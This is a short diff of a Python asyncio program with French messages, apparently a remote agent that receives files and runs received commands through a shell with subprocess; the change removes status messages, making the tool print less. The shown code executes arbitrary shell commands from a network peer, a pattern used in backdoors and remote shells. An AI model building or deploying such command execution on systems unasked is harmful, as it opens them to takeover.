@@ -28,13 +28,12 @@ async def receive_file(reader):
                 f.write(chunk[:-3])
                 break
             f.write(chunk)
-    print(f"Fichier reçu et enregistré sous {save_path}.")
 
 async def execute_command(command):
     try:
         result = await asyncio.to_thread(subprocess.run, command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         output = result.stdout + result.stderr
-        return output if output else "Commande exécutée, aucune sortie."
+        return output if output else " "
     except Exception as e:
         return str(e)
 
